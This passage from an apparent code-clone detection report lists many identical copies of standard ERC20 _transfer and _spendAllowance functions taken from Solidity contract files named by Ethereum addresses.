<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="108" endline="120" pcid="8590">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="108" endline="120" pcid="5083">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="107" endline="119" pcid="7841">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="93" endline="105" pcid="6557">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="113" endline="125" pcid="5068">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="109" endline="121" pcid="2455">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="114" endline="126" pcid="1673">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="107" endline="119" pcid="6270">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="114" endline="126" pcid="584">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="206" endline="218" pcid="7374">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="107" endline="119" pcid="366">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="109" endline="121" pcid="5053">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="109" endline="121" pcid="6285">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="109" endline="121" pcid="2948">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="107" endline="119" pcid="7825">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="110" endline="122" pcid="3214">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="108" endline="120" pcid="2933">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="105" endline="117" pcid="5038">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="110" endline="122" pcid="3585">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="111" endline="123" pcid="3570">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="107" endline="119" pcid="6544">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="96" endline="108" pcid="3505">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="112" endline="124" pcid="8415">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="108" endline="120" pcid="5023">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="110" endline="122" pcid="6325">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="108" endline="120" pcid="6310">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="111" endline="123" pcid="1688">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="109" endline="121" pcid="3555">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="105" endline="117" pcid="5008">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="109" endline="121" pcid="8430">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="110" endline="122" pcid="2273">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="111" endline="123" pcid="1204">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="110" endline="122" pcid="3079">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="111" endline="123" pcid="1117">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="111" endline="123" pcid="9027">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="111" endline="123" pcid="8445">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
</class>

<class classid="40" nclones="479" nlines="7" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="127" endline="137" pcid="58">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="124" endline="134" pcid="1301">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="126" endline="136" pcid="7241">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="121" endline="131" pcid="8461">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="125" endline="135" pcid="4667">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="120" endline="130" pcid="6356">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="126" endline="136" pcid="6724">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="122" endline="132" pcid="7613">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="125" endline="135" pcid="686">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="122" endline="132" pcid="4324">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="122" endline="132" pcid="8841">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="120" endline="130" pcid="7750">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="125" endline="135" pcid="197">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="120" endline="130" pcid="3796">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="124" endline="134" pcid="314">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="121" endline="131" pcid="6142">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="124" endline="134" pcid="5522">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="123" endline="133" pcid="9166">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="121" endline="131" pcid="5505">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="125" endline="135" pcid="1689">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="121" endline="131" pcid="5871">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="124" endline="134" pcid="7044">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="121" endline="131" pcid="8789">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="123" endline="133" pcid="440">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="125" endline="135" pcid="1377">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="125" endline="135" pcid="1496">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="120" endline="130" pcid="7996">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="123" endline="133" pcid="182">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
